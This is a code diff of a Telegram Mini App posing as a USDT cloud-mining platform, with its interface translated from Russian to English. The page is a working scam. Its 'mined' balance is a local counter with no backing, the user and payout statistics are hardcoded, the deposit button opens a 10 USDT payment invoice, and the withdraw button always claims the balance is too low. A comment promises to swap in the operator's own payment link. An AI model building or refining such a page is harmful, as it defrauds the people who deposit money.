@@ -1,49 +1,57 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mining Platform</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .balance { font-size: 40px; color: #ffca28; margin-bottom: 20px; }
-        button { background: #ffca28; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; width: 80%; margin: 10px 0; font-size: 18px; }
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; overflow: hidden; user-select: none; }
+        .balance { font-size: 48px; font-weight: bold; margin-top: 50px; color: #fff; }
+        .usdt { font-size: 18px; color: #888; margin-bottom: 10px; }
+        .stat-card { display: flex; justify-content: space-around; background: #111; padding: 15px; border-radius: 15px; margin: 25px 0; border: 1px solid #222; }
+        .stat-item { text-align: center; }
+        .stat-label { color: #888; font-size: 10px; text-transform: uppercase; display: block; margin-bottom: 5px; }
+        .stat-value { color: #fff; font-weight: bold; font-size: 16px; }
+        .divider { width: 1px; background: #222; }
+        button { background: #fff; color: #000; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; margin-bottom: 10px; cursor: pointer; }
+        .btn-withdraw { background: #1a1a1a; color: #555; }
     </style>
 </head>
 <body>
-    <div class="balance" id="balance">0.000000 USDT</div>
-    <div style="margin-bottom: 40px; color: #888;">Мощность: 1.00 TH/s</div>
-    <div style="display: flex; justify-content: space-around; background: #111; padding: 15px; border-radius: 12px; margin-bottom: 25px; border: 1px solid #222;">
-    <div style="text-align: center;">
-        <span style="color: #888; font-size: 11px; text-transform: uppercase;">Пользователей</span><br>
-        <span style="color: #fff; font-weight: bold; font-size: 16px;">4,281</span>
+    <div class="usdt">USDT BALANCE</div>
+    <div class="balance" id="balance">0.000000</div>
+    <div style="color: #00ff88; font-size: 14px; margin-top: 5px;">● Mining Active: 1.25 TH/s</div>
+
+    <div class="stat-card">
+        <div class="stat-item">
+            <span class="stat-label">Users Online</span>
+            <span class="stat-value">4,281</span>
+        </div>
+        <div class="divider"></div>
+        <div class="stat-item">
+            <span class="stat-label">Total Paid</span>
+            <span class="stat-value" style="color: #00ff88;">1,150 USDT</span>
+        </div>
     </div>
-    <div style="width: 1px; background: #222;"></div>
-    <div style="text-align: center;">
-        <span style="color: #888; font-size: 11px; text-transform: uppercase;">Выплачено</span><br>
-        <span style="color: #00ff88; font-weight: bold; font-size: 16px;">1,150 USDT</span>
-    </div>
-    </div>
-    
-    <button onclick="deposit()">ДЕПОЗИТ</button>
-    <button style="background: #333; color: #fff;">ВЫВОД</button>
+
+    <button onclick="deposit()">DEPOSIT</button>
+    <button class="btn-withdraw" onclick="tg.showAlert('Minimum withdrawal is 10 USDT. Your balance is too low.')">WITHDRAW</button>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        let bal = parseFloat(localStorage.getItem('m_bal')) || 0;
+        let bal = parseFloat(localStorage.getItem('m_bal')) || 0.000000;
 
         setInterval(() => {
             bal += 0.000001;
-            document.getElementById('balance').innerText = bal.toFixed(6) + " USDT";
+            document.getElementById('balance').innerText = bal.toFixed(6);
             localStorage.setItem('m_bal', bal);
         }, 1000);
 
         function deposit() {
-            tg.showConfirm("Создать счет на 5 USDT?", (confirm) => {
+            tg.showConfirm("Create a deposit invoice for 10 USDT?", (confirm) => {
                 if (confirm) {
-                    tg.openTelegramLink("https://t.me/CryptoBot?start=pay");
+                    tg.openTelegramLink("https://t.me/CryptoBot?start=IV6LpX7L1q2z"); // Сюда потом вставим твою ссылку
                 }
             });
         }
